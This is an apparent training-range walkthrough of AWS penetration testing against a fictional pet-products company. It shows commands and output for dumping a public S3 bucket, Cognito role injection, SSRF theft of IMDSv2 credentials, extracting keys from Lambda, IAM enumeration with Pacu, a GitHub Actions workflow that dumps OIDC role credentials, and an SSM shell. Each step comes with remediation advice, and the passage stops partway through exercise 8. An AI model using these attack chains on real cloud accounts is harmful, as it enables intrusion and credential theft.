# Range Village Cloud Range 2026 Public - Introduction to AWS Cloud Penetration Testing

## Overview

Palmart is a Singapore-based company dedicated to delivering high-quality pet products. Currently, the company has employed a Cloud Solution Architect to migrate its legacy infrastructure to AWS.

To support this transition, Palmart has engaged a third-party provider to conduct a grey box penetration test of their AWS environment. The assessment will focus on a web application hosted on a public-facing EC2 instance. Consistent with a grey box approach, the tester will be provided with Palmart’s AWS architecture diagram to facilitate the assessment.

![aws-architecture.drawio](aws-architecture.png)

---

## Table of Contents

- [Range Village Cloud Range 2026 Public - Introduction to AWS Cloud Penetration Testing](#range-village-cloud-range-2026-public---introduction-to-aws-cloud-penetration-testing)
  - [Overview](#overview)
  - [Table of Contents](#table-of-contents)
  - [Scope](#scope)
  - [Objective](#objective)
  - [Exercise 1: Enumerate Publicly Accessible Files on AWS S3](#exercise-1-enumerate-publicly-accessible-files-on-aws-s3)
    - [What is AWS S3?](#what-is-aws-s3)
    - [Exploitation](#exploitation)
    - [Remediation](#remediation)
    - [Further Reading](#further-reading)
  - [Exercise 2: Abuse AWS Cognito User Pool to Self Sign Up User](#exercise-2-abuse-aws-cognito-user-pool-to-self-sign-up-user)
    - [What is AWS Cognito?](#what-is-aws-cognito)
    - [Exploitation](#exploitation-1)
    - [Remediation](#remediation-1)
    - [Further Reading](#further-reading-1)
  - [Exercise 3: SSRF to Access AWS IMDSv2](#exercise-3-ssrf-to-access-aws-imdsv2)
    - [What is SSRF and IMDS?](#what-is-ssrf-and-imds)
    - [Exploitation](#exploitation-2)
    - [Remediation](#remediation-2)
    - [Further Reading](#further-reading-2)
  - [Exercise 4: Enumerate AWS Lambda](#exercise-4-enumerate-aws-lambda)
    - [What is AWS Lambda?](#what-is-aws-lambda)
    - [Exploitation](#exploitation-3)
    - [Remediation](#remediation-3)
    - [Further Reading](#further-reading-3)
  - [Exercise 5: Utilize Pacu to Perform Automated IAM Enumeration](#exercise-5-utilize-pacu-to-perform-automated-iam-enumeration)
    - [What is Pacu?](#what-is-pacu)
    - [Exploitation](#exploitation-4)
    - [Remediation](#remediation-4)
    - [Further Reading](#further-reading-4)
  - [Exercise 6: Abuse AWS GitHub OIDC Trust](#exercise-6-abuse-aws-github-oidc-trust)
    - [What is GitHub OIDC?](#what-is-github-oidc)
    - [Exploitation](#exploitation-5)
    - [Remediation](#remediation-5)
    - [Further Reading](#further-reading-5)
  - [Exercise 7: Utlize SSM to Get RCE over EC2](#exercise-7-utlize-ssm-to-get-rce-over-ec2)
    - [What is AWS Systems Manager (SSM)?](#what-is-aws-systems-manager-ssm)
    - [Exploitation](#exploitation-6)
    - [Remediation](#remediation-6)
    - [Further Reading](#further-reading-6)
  - [Exercise 8: Download from S3 (VPC Endpoint)](#exercise-8-download-from-s3-vpc-endpoint)
    - [What are S3 Bucket Policies and VPC Endpoints?](#what-are-s3-bucket-policies-and-vpc-endpoints)
    - [Exploitation](#exploitation-7)
    - [Remediation](#remediation-7)
    - [Further Reading](#further-reading-7)
  - [Exercise 9: Create Access Key and Get Flag](#exercise-9-create-access-key-and-get-flag)
    - [What is the Break-Glass?](#what-is-the-break-glass)
    - [Exploitation](#exploitation-8)
    - [Remediation](#remediation-8)
  - [Acknowledgments](#acknowledgments)

---

## Scope

The scope of this assessment is strictly limited to resources containing the specific tag.

* **In-Scope:** All AWS resources tagged with `ManagedBy: Terraform`.
* **Out-of-Scope:** The `Administrator` IAM Group is expressly excluded from all testing activities.

---

## Objective

* By any means necessary, within the defined scope, obtain access to the `break-glass` user and retrieve the final flag.

---

## Exercise 1: Enumerate Publicly Accessible Files on AWS S3

### What is AWS S3?

Amazon Simple Storage Service (AWS S3) is an object storage service offering industry-leading scalability, data availability, security, and performance. S3 is commonly used for backup and archival, data lakes, hosting static websites, and application data storage.



In security assessments, S3 buckets are a frequent target due to misconfigurations that allow unauthorized public access, enumeration, or data exfiltration.

### Exploitation

**Step 1: Identify the Bucket**
Examination of the Web Application's HTML source code reveals a direct reference to an S3 bucket URL in an image tag.

```html
<img src="https://palmart-rv-prod-s3.s3.ap-southeast-1.amazonaws.com/images/dog-food.jpg" alt="Premium Dog Food">
```

**Step 2: Enumerate the Bucket**
Use the AWS CLI to list the contents of the identified bucket. The `--no-sign-request` flag allows interaction with the bucket anonymously, without AWS credentials.

```bash
aws s3 ls s3://palmart-rv-prod-s3 --no-sign-request
    PRE images/
    PRE private/
    PRE web_application/
```

**Step 3: Mirror the Bucket Content**
Since the bucket is publicly listable, attempt to download (dump) its entire contents to your local machine.

```bash
mkdir palmart-rv-prod-s3
aws s3 sync s3://palmart-rv-prod-s3 palmart-rv-prod-s3 --no-sign-request
```

**Step 4: Analyze Exfiltrated Data**
While the `private/` folder returns an `AccessDenied` error (indicating correct permissions on that specific prefix), the `web_application/` folder is accessible.

Inspect the downloaded `.env` file found in `web_application/`:

```bash
cat palmart-rv-prod-s3/web_application/.env
```

```ini
COGNITO_USER_POOL_ID=[REDACTED]
COGNITO_CLIENT_ID=[REDACTED]
AWS_REGION=ap-southeast-1
LAMBDA_PDF_GENERATOR_NAME=[REDACTED]
S3_BUCKET_URL=[REDACTED]
```

> **Critical Finding:** The `.env` file exposes the AWS Cognito User Pool ID and Client ID. This file should never be publicly accessible.

### Remediation

To prevent S3 data exposure:
1.  **Block Public Access:** Enable "Block Public Access" settings at both the account and bucket levels. (This is enabled by default)
2.  **Least Privilege:** Implement restrictive Bucket Policies that only allow access to specific IAM principals.
3.  **Secure Configuration Management:** Never store sensitive configuration files (like `.env`) in public storage. Use **AWS Systems Manager Parameter Store** or **AWS Secrets Manager**.

### Further Reading
* [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
* [Hacktricks - S3 Enumeration](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum.html)
* [Internal All The Things - S3](https://swisskyrepo.github.io/InternalAllTheThings/cloud/aws/aws-s3-bucket/)

---

## Exercise 2: Abuse AWS Cognito User Pool to Self Sign Up User

### What is AWS Cognito?

Amazon Cognito is a user identity and access management service. It handles user authentication and authorization for web and mobile applications.



### Exploitation

The source code analysis reveals that the application uses Amazon Cognito for authentication and relies on a custom attribute `custom:role` to determine administrative privileges.

**Step 1: Register a New User**
Using the leaked Client ID from Exercise 1, use the AWS CLI to register a new user. Attempt to inject the `custom:role` attribute set to `admin`.

```bash
aws cognito-idp sign-up \
  --region ap-southeast-1 \
  --client-id <CLIENT_ID> \
  --username user@example.com \
  --password 'StrongPassword123!' \
  --user-attributes \
    Name=email,Value=user@example.com \
    Name=custom:role,Value=admin
```

```json
{
    "UserConfirmed": false,
    "CodeDeliveryDetails": {
        "Destination": "u***@e***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    },
    "UserSub": "f90a05cc-c041-708f-7bc0-7bfb0f48ef68"
}
```

> **Note:** Use a valid email address or a temporary email service (e.g., temp-mail.org) to receive the confirmation code.

**Step 2: Confirm the User**
Check your email for the confirmation code, then verify the user:

```bash
aws cognito-idp confirm-sign-up \
  --region ap-southeast-1 \
  --client-id <CLIENT_ID> \
  --username user@example.com \
  --confirmation-code 123456
```

**Step 3: Log In**
Log in to the web application with your new credentials. If the attack was successful, you will have administrative access to the web application.

### Remediation

To prevent Cognito abuse:
1.  **Disable Self-Registration:** If the application is internal, disable the public sign-up feature.
2.  **Protect Attributes:** Mark sensitive attributes (like `custom:role`) as **mutable by app client: No** or restrict write access.
3.  **Pre-Sign-up Triggers:** Use Lambda triggers to validate user attributes and reject unauthorized role assignments.

### Further Reading
* [Hacking the Cloud - Cognito User Self Signup](https://hackingthe.cloud/aws/exploitation/cognito_user_self_signup/)
* [AWS Cognito Security Best Practices](https://docs.aws.amazon.com/cognito/latest/developerguide/security.html)
* [Hacktricks - AWS Cognito](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/cognito-user-pools.html)

---

## Exercise 3: SSRF to Access AWS IMDSv2

### What is SSRF and IMDS?

**Server-Side Request Forgery (SSRF)** is a vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can be used to access internal services, including the AWS Instance Metadata Service.


**Instance Metadata Service (IMDS)** is a service available to EC2 instances at the link-local address `169.254.169.254`. It provides information about the instance, including IAM credentials if an instance role is attached.


### Exploitation

The application's Admin Panel allows administrators to import product data via a URL. This feature is vulnerable to SSRF.

**Step 1: Attempt IMDSv1 Access**
Setting the supplier API URL to `http://169.254.169.254/latest/` returns a `401 Unauthorized` error. This indicates that **IMDSv2** is enabled, which requires a session token.

**Step 2: Retrieve IMDSv2 Token**
IMDSv2 requires an HTTP `PUT` request to retrieve a session token.

Configure the request in the Admin Panel:
* **Supplier API URL:** `http://169.254.169.254/latest/api/token`
* **HTTP Method:** `PUT`
* **Headers:** `{"X-aws-ec2-metadata-token-ttl-seconds": "21600"}`
* **Request Body:** `None`

*Response:*
```json
{
    "token": "[REDACTED_TOKEN]"
}
```

**Step 3: Retrieve IAM Credentials**
Use the retrieved token to query the metadata service for security credentials.

* **Supplier API URL:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/palmart-rv-prod-ec2-role`
* **HTTP Method:** `GET`
* **Headers:** `{"X-aws-ec2-metadata-token": "[REDACTED_TOKEN]"}`

*Response:*
```json
{
  "AccessKeyId": "[REDACTED]",
  "SecretAccessKey": "[REDACTED]",
  "Token": "[REDACTED]",
  "Type": "AWS-HMAC"
}
```

> **Note:** You can take your time to review the different APIs available in the IMDSv2. It is a treasure trove of information.

### Remediation

To prevent SSRF attacks targeting IMDS:
1.  **Enforce Hop Limit:** Set the IMDSv2 response hop limit to `1` to prevent access from containers or proxied requests.
2.  **Input Validation:** Implement strict allowlists for external URLs.
3.  **Network Restrictions:** Block access to link-local addresses (`169.254.169.254`) at the application or firewall level.

### Further Reading
* [AWS IMDS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
* [Hacking the Cloud - Steal EC2 Metadata Credentials via SSRF](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/)
* [OWASP - Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
* [Hacktricks - AWS Cloud SSRF](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html#ssrf)
* [Internal All The Things - Metadata SSRF](https://swisskyrepo.github.io/InternalAllTheThings/cloud/aws/aws-metadata/)

---

## Exercise 4: Enumerate AWS Lambda

### What is AWS Lambda?

AWS Lambda is a serverless compute service that runs code in response to events.


### Exploitation

The `.env` file from Exercise 1 revealed a Lambda function name: `palmart-rv-prod-pdf-generator`. The Lambda function is used to generate PDF receipts.

**Step 1: Configure Credentials**
Configure the AWS CLI with the temporary credentials stolen in Exercise 3.

```bash
aws configure --profile ec2role  
AWS Access Key ID [None]: [REDACTED]
AWS Secret Access Key [None]: [REDACTED]
AWS Session Token [None]: [REDACTED]
Default region name [None]: ap-southeast-1
Default output format [None]: 
```

> **Note:** If you are using a later version of AWS CLI, it should automatically prompt for the session token. If it doesn't, you can set the session token manually.

```bash
aws configure set aws_session_token [REDACTED] --profile ec2role
```

Verify the credentials are working.

```bash
aws sts get-caller-identity --profile ec2role
{
    "UserId": "AROAZNKM5ODGJVCTDALX5:i-03ccf8ba71d0920eb",
    "Account": "[REDACTED]",
    "Arn": "arn:aws:sts::[REDACTED]:assumed-role/palmart-rv-prod-ec2-role/i-03ccf8ba71d0920eb"
}
```

**Step 2: Retrieve Source Code**
Use the `get-function` command to generate a presigned URL for the Lambda source code.

```bash
aws lambda get-function \
  --function-name palmart-rv-prod-pdf-generator \
  --profile ec2role \
  --output text
```

**Step 3: Analyze Source Code**
Within the Lambda function source code, the credentials for the `dev-user` are hardcoded.
```python
aws_access_key_id = [REDACTED]
aws_secret_access_key = [REDACTED]
```

### Remediation

1.  **No Hardcoded Secrets:** Never embed credentials in source code. Use **AWS Secrets Manager**.
2.  **Restrict Access:** Deny `lambda:GetFunction` permissions to unauthorized roles and users.
3.  **Code Scanning:** Implement automated scanning in CI/CD pipelines to catch secrets.

### Further Reading

* [AWS Lambda Security Best Practices](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)
* [HackTricks - AWS Lambda Enum](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-lambda-enum.html)
* [Internal All The Things - Lambda](https://swisskyrepo.github.io/InternalAllTheThings/cloud/aws/aws-lambda/)
* [Scanning AWS Lambda functions with Amazon Inspector](https://docs.aws.amazon.com/inspector/latest/user/scanning-lambda.html)

---

## Exercise 5: Utilize Pacu to Perform Automated IAM Enumeration

### What is Pacu?

Pacu is an open-source AWS exploitation framework designed for offensive security testing. It automates the process of enumerating permissions, escalating privileges, and exploiting misconfigurations.

### Exploitation

**Step 1: Configure the Dev Session**
Configure a new AWS CLI profile with the credentials found in the Lambda function.

```bash
aws configure --profile dev
AWS Access Key ID [None]: [REDACTED]
AWS Secret Access Key [None]: [REDACTED]
Default region name [None]: ap-southeast-1
Default output format [None]: json
```

Verify that the `dev` credentials is working.

```bash
aws sts get-caller-identity --profile dev
{
    "UserId": "AIDAZNKM5ODGI6N4QKYI6",
    "Account": "[REDACTED]",
    "Arn": "arn:aws:iam::[REDACTED]:user/dev-user"
}
```

**Step 2: Initialize Pacu**
Start Pacu and import the credentials.

```bash
pacu --new-session dev
pacu

 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣉⣙⣛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠿⢿⣿⣷⣦⣄⠀⠀⠈⠛⠋⠀⠀⠀⠈⠻⣿⣷⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⣤⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣆⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣬⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣉⣉⣡⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣶⣄⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⣤⣶⡿⣿⣿⠉⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣧⡀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⣶⣿⡟⠻⣿⠃⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧
 ⢀⣀⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣾⣿⠉⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
 ⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡟
 ⠀⠀⠀⠀⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁
 ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⣴⣆⢀⣴⣆⠀⣼⣆⠀⠀⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠋⠀⠀
 ⠀⠀⠀⣼⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀
 ⠀⠀⠀⣿⣿⠟⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣶⡀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣆⠀⢰⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠘⠁⠀⠀⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢿⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⣿⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠸⠿⠿⠟⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢀⣀⣀⣀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⠀⠀⠀⢸⣿⣿⡏⠉⠉⢹⣿⣿⡇⠀⢸⣿⣿⣇⣀⣀⣸⣿⣿⣿⠀⢸⣿⣿⣿⣀⣀⣀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀

Version: unknown
Found existing sessions:
  [0] New session
  [1] dev
Choose an option: 1
```

With the newly created session, we can now import the keys from the credentials file.

```bash
Pacu (dev:No Keys Set) > import_keys dev
  Imported keys as "imported-dev"
Pacu (dev:imported-dev) > 
```


**Step 3: Enumerate Permissions**
Run the following modules to discover user permissions and resources.

```bash
exec iam__enum_permissions
exec iam__enum_users_roles_policies_groups
```

```bash
Pacu (dev:imported-dev) > exec iam__enum_permissions
  Running module iam__enum_permissions...
[iam__enum_permissions] Confirming permissions for users:
[iam__enum_permissions]   dev-user...
[iam__enum_permissions]     Confirmed Permissions for dev-user
[iam__enum_permissions] iam__enum_permissions completed.

[iam__enum_permissions] MODULE SUMMARY:

  65 Confirmed permissions for user: dev-user.
   0 Confirmed permissions for 0 role(s).
   0 Unconfirmed permissions for 0 user(s).
   0 Unconfirmed permissions for 0 role(s).
Type 'whoami' to see detailed list of permissions.

Pacu (dev:imported-dev) > exec iam__enum_users_roles_policies_groups
  Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] Found 6 users
[iam__enum_users_roles_policies_groups] Found 8 roles
[iam__enum_users_roles_policies_groups] Found 5 policies
[iam__enum_users_roles_policies_groups] Found 1 groups
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  6 Users Enumerated
  8 Roles Enumerated
  5 Policies Enumerated
  1 Groups Enumerated
  IAM resources saved in Pacu database.

Pacu (dev:imported-dev) > 
```

**Step 4: Dump Authorization Details**
The enumeration reveals that the `dev-user` has `iam:Get*` and `iam:List*` permissions. Use this to dump the account's entire authorization model.

```bash
aws iam get-account-authorization-details --profile dev > account-authorization-details.json
```

### Remediation

1.  **Least Privilege:** Avoid attaching broad `Get*` and `List*` policies to users.
2.  **Monitor Enumeration:** Alert on high volumes of IAM API calls via **Amazon GuardDuty** or **CloudTrail**.

### Further Reading

- [Pacu GitHub Repository](https://github.com/RhinoSecurityLabs/pacu)
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [HackTricks - IAM Enumeration](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-iam-enum.html)
- [Hacking The Cloud - Bruteforce IAM Permissions](https://hackingthe.cloud/aws/enumeration/brute_force_iam_permissions/)

---

## Exercise 6: Abuse AWS GitHub OIDC Trust

### What is GitHub OIDC?

GitHub OIDC (OpenID Connect) allows GitHub Actions workflows to authenticate with AWS without storing long-lived credentials. AWS creates a trust relationship with GitHub's OIDC provider, allowing workflows to assume IAM roles based on claims in the OIDC token (such as repository name, branch, etc.).



### Exploitation

Analysis of the `account-authorization-details.json` reveals a role named `palmart-rv-prod-github-actions-role` with a misconfigured trust policy.

**Vulnerable Trust Policy:**
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::[REDACTED]:oidc-provider/token.actions.githubusercontent.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
                },
                "StringLike": {
                    "token.actions.githubusercontent.com:sub": "repo:*/Palmart-Range-Village:*"
                }
            }
        }
    ]
}
```
> **Vulnerability:** The wildcard `*` before the repository name allows *any* GitHub organization to assume this role if they create a repository named `Palmart-Range-Village`.

**Step 1: Create a Github Repository**
1.  Create a private GitHub repository named `Palmart-Range-Village`.
2.  Create a GitHub Action workflow (`.github/workflows/attack.yml`) with the following content:

```yaml
name: Dump Credentials
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read

jobs:
  tf:
    name: Dump Credentials
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111111111111:role/palmart-rv-prod-github-actions-role
          aws-region: ap-southeast-1
      
      - name: Exfiltrate Command
        run: |
          KEY_ID=$(echo -n "$AWS_ACCESS_KEY_ID" | gzip -c | base64 -w 0)
          SECRET_KEY=$(echo -n "$AWS_SECRET_ACCESS_KEY" | gzip -c | base64 -w 0)
          SESSION_TOKEN=$(echo -n "$AWS_SESSION_TOKEN" | gzip -c | base64 -w 0)

          echo "$KEY_ID"
          echo "$SECRET_KEY"
          echo "$SESSION_TOKEN"
```

**Step 2: Execute**
Run the workflow and view the logs to retrieve the STS temporary credentials.

### Remediation

1.  **Strict Conditions:** Always specify the exact organization and repository in the trust policy.
    * *Bad:* `repo:*/RepoName:*`
    * *Good:* `repo:MyOrg/RepoName:*`
2.  **Branch Restrictions:** Limit role assumption to specific branches (e.g., `ref:refs/heads/main`).

### Further Reading

* [GitHub OIDC with AWS](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)
* [Exploiting Misconfigured GitLab OIDC AWS IAM Roles](https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/)
* [AWS IAM OIDC Identity Providers](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html)
* [HackTricks AWS Federation Abuse](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.html)

---

## Exercise 7: Utlize SSM to Get RCE over EC2

### What is AWS Systems Manager (SSM)?

AWS Systems Manager Session Manager allows users to manage EC2 instances through an interactive one-click browser-based shell or via the AWS CLI, without opening inbound ports.

### Exploitation

The GitHub Actions role retrieved in Exercise 6 has the `ssm:StartSession` permission for a specific instance.

```json
{
    "Statement": [
        {
            "Action": [
                "ssm:StartSession",
                "ssm:SendCommand",
                "ssm:ListCommands",
                "ssm:ListCommandInvocations",
                "ssm:GetCommandInvocation"
            ],
            "Effect": "Allow",
            "Resource": "arn:aws:ec2:ap-southeast-1:[REDACTED]:instance/i-03ccf8ba71d0920eb",
            "Sid": "SSMSendCommand"
        },
        {
            "Action": [
                "ssm:DescribeInstanceInformation",
                "ec2:DescribeInstances"
            ],
            "Effect": "Allow",
            "Resource": "arn:aws:ec2:ap-southeast-1:[REDACTED]:instance/i-03ccf8ba71d0920eb",
            "Sid": "SSMDescribeInstances"
        }
    ],
    "Version": "2012-10-17"
}
```

**Step 1: Configure Session Credentials**
```bash
aws configure --profile github
# Input the credentials retrieved from GitHub Actions
```

Verify the credentials are working.

```bash
aws sts get-caller-identity --profile github
{
    "UserId": "AROAZNKM5ODGK5VKT4LDC:GitHubActions",
    "Account": "[REDACTED]",
    "Arn": "arn:aws:sts::[REDACTED]:assumed-role/palmart-rv-prod-github-actions-role/GitHubActions"
}
```


**Step 2: Start a Session**
Target the instance ID identified in the IAM policy.

```bash
aws ssm start-session --target <instance-id> --profile github
```
> **Note**: The instance ID will be different

You now have a shell on the internal EC2 instance.

### Remediation

1.  **Document Restrictions:** Use SSM Document permissions to limit which commands can be run (e.g., prevent `bash` access).
2.  **Logging:** Enable session logging to S3/CloudWatch to audit command history.

### Further Reading

* [AWS SSM Session Manager](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html)
* [Hacking the Cloud - SSM Abuse](https://hackingthe.cloud/aws/post_exploitation/run_shell_commands_on_ec2/)
* [HackTricks - AWS EC2 SSM](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html#ssm)

---

## Exercise 8: Download from S3 (VPC Endpoint)

### What are S3 Bucket Policies and VPC Endpoints?

S3 bucket policies are resource-based policies that define who can access the bucket and what actions they can perform. **VPC Endpoints** allow private connectivity between your VPC and supported AWS services without requiring an internet gateway.

The `aws:SourceVpce` condition in bucket policies can restrict access to requests that come through a specific VPC endpoint, adding a network-level access control.


### Exploitation

The `palmart-rv-prod-s3` bucket policy denies access to the `private/` folder unless the request originates from a specific VPC Endpoint (`vpce-...`).

```bash
aws s3api get-bucket-policy --bucket palmart-rv-prod-s3 --output text
```

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": [
                "arn:aws:s3:::palmart-rv-prod-s3/images/*",
                "arn:aws:s3:::palmart-rv-prod-s3/web_application/*"
            ]
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::palmart-rv-prod-s3"
        },
        {
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::palmart-rv-prod-s3/private/*",
            "Condition": {
                "StringNotEquals": {
                    "aws:PrincipalArn": "arn:aws:iam::111111111111:user/range-admin",
                    "aws:SourceVpce": "vpce-0de39beae349a9ad5"
                }
            }
        }
    ]
}
```


**Step 1: Leverage Internal Access**
